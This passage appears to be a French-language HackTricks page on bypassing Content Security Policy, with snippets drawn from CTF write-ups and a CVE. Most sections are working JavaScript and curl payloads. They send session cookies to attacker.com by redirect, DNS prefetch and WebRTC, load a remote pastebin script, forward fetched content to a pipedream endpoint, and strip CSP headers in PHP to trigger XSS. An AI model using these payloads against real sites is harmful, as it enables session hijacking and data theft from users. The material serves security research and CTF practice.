In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), il a été possible via **HTML injection** de **restreindre** davantage une **CSP** de sorte qu'un script empêchant la **CSTI** ait été désactivé et que, par conséquent, la **vulnérabilité soit devenue exploitable.**\
Une **CSP** peut être rendue plus restrictive en utilisant des **HTML meta tags**, et les inline scripts peuvent être désactivés en **supprimant** l'**entrée** autorisant leur **nonce** et en **autorisant un script inline spécifique via sha** :
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### Exfiltration JS avec Content-Security-Policy-Report-Only

Si vous parvenez à faire en sorte que le serveur réponde avec l'en-tête **`Content-Security-Policy-Report-Only`** avec une **valeur que vous contrôlez** (peut-être à cause d'un CRLF), vous pouvez le faire pointer vers votre serveur et si vous **entourez** le **contenu JS** que vous voulez exfiltrer avec **`<script>`** et comme il est très probable que `unsafe-inline` ne soit pas autorisé par la CSP, cela **provoquera une erreur CSP** et une partie du script (contenant les informations sensibles) sera envoyée au serveur via `Content-Security-Policy-Report-Only`.

Pour un exemple [**consultez ce writeup CTF**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Fuite d'informations avec CSP et iframe

- Un `iframe` est créé qui pointe vers une URL (appelons-la `https://example.redirect.com`) qui est permise par la CSP.
- Cette URL redirige ensuite vers une URL secrète (par ex., `https://usersecret.example2.com`) qui n'est **pas autorisée** par la CSP.
- En écoutant l'événement `securitypolicyviolation`, on peut capturer la propriété `blockedURI`. Cette propriété révèle le domaine de l'URI bloquée, divulguant le domaine secret vers lequel l'URL initiale a redirigé.

Il est intéressant de noter que des navigateurs comme Chrome et Firefox ont des comportements différents dans la gestion des iframes vis‑à‑vis de la CSP, ce qui peut conduire à une divulgation potentielle d'informations sensibles en raison d'un comportement non défini.

Une autre technique consiste à exploiter la CSP elle‑même pour déduire le sous‑domaine secret. Cette méthode repose sur un algorithme de recherche binaire et sur l'ajustement de la directive CSP pour inclure des domaines spécifiques qui sont délibérément bloqués. Par exemple, si le sous‑domaine secret est composé de caractères inconnus, vous pouvez tester itérativement différents sous‑domaines en modifiant la directive CSP pour bloquer ou autoriser ces sous‑domaines. Voici un extrait montrant comment la CSP pourrait être configurée pour faciliter cette méthode:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
En surveillant quelles requêtes sont bloquées ou autorisées par la CSP, on peut restreindre les caractères possibles du sous-domaine secret et finalement découvrir l'URL complète.

Les deux méthodes exploitent les subtilités de l'implémentation de la CSP et du comportement des navigateurs, démontrant comment des politiques apparemment sécurisées peuvent involontairement leak des informations sensibles.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Technologies non sécurisées pour contourner CSP

### Erreurs PHP quand trop de params

According to the [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), l'envoi d'un nombre trop élevé de paramètres (1001 paramètres GET bien que vous puissiez aussi le faire avec des params POST et plus de 20 fichiers). Toute **`header()`** définie dans le code PHP **ne sera pas envoyée** à cause de l'erreur que cela déclenche.

### Surcharge du tampon de réponse PHP

PHP est connu pour tamponner la réponse jusqu'à 4096 bytes par défaut. Ainsi, si PHP génère un warning, en fournissant suffisamment de données dans les warnings, la réponse sera envoyée avant l'en-tête CSP, ce qui fait que l'en-tête sera ignoré.\
Ensuite, la technique consiste essentiellement à remplir le tampon de réponse avec des warnings pour que l'en-tête CSP ne soit pas envoyé.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Désactiver CSP via max_input_vars (headers already sent)

Parce que les en-têtes doivent être envoyés avant toute sortie, les warnings émis par PHP peuvent invalider des appels `header()` ultérieurs. Si les entrées utilisateur dépassent `max_input_vars`, PHP génère d'abord un warning de démarrage ; tout `header('Content-Security-Policy: ...')` ultérieur échouera avec “headers already sent”, désactivant effectivement la CSP et permettant un reflective XSS qui serait autrement bloqué.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Exemple :
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Rewrite Error Page

D'après [**this writeup**](https://blog.ssrf.kr/69), il semble qu'il était possible de bypass une protection CSP en chargeant une page d'erreur (potentiellement sans CSP) et en réécrivant son contenu.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME est une technique qui abuse d'un XSS (ou d'un XSS très limité) **dans un endpoint d'une page** pour **abuser** **d'autres endpoints de la même origine.** Cela se fait en chargeant le endpoint vulnérable depuis une page attaquante puis en actualisant la page attaquante vers le endpoint réel de la même origine que vous souhaitez abuser. De cette façon, le **endpoint vulnérable** peut utiliser l'objet **`opener`** dans le **payload** pour **accéder au DOM** du **endpoint réel à abuser**. Pour plus d'informations, consultez:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

De plus, **wordpress** possède un endpoint **JSONP** à `/wp-json/wp/v2/users/1?_jsonp=data` qui **reflète** les **data** envoyées dans la sortie (avec la limitation n'acceptant que lettres, chiffres et points).

Un attaquant peut abuser de cet endpoint pour **générer une attaque SOME** contre WordPress et **l'intégrer** à l'intérieur de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` — notez que ce **script** sera **chargé** car il est **autorisé par 'self'**. De plus, et parce que WordPress est installé, un attaquant pourrait exploiter l'**attaque SOME** via le **callback** **endpoint** vulnérable qui **contourne la CSP** pour donner plus de privilèges à un utilisateur, installer un nouveau plugin...\
Pour plus d'informations sur la façon d'effectuer cette attaque, consultez [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Contournements d'exfiltration CSP

S'il existe une CSP stricte qui ne permet pas d'**interagir avec des serveurs externes**, il y a quelques techniques que vous pouvez toujours utiliser pour exfiltrer l'information.

### Location

Vous pouvez simplement mettre à jour la location pour envoyer au serveur de l'attaquant les informations secrètes:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Vous pouvez rediriger en injectant une meta tag (c'est juste une redirection, cela ne va pas leak le contenu)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Pour charger les pages plus rapidement, les navigateurs vont pré-résoudre les noms d'hôte en adresses IP et les mettre en cache pour une utilisation ultérieure.\
Vous pouvez indiquer à un navigateur de pré-résoudre un nom d'hôte avec : `<link rel="dns-prefetch" href="something.com">`

Vous pouvez abuser de ce comportement pour **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Une autre façon :
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Pour éviter que cela ne se produise, le serveur peut envoyer l'en-tête HTTP :
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Apparemment, cette technique ne fonctionne pas dans les headless browsers (bots)

### WebRTC

Sur plusieurs pages, vous pouvez lire que **WebRTC ne vérifie pas la directive `connect-src` du CSP**.

En fait, vous pouvez _leak_ des informations en utilisant une _DNS request_. Regardez ce code:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Une autre option :
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Le credential popup envoie une requête DNS vers l'iconURL sans être restreint par la page. Il ne fonctionne que dans un contexte sécurisé (HTTPS) ou sur localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Vérifier les politiques CSP en ligne

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Création automatique de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Références

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
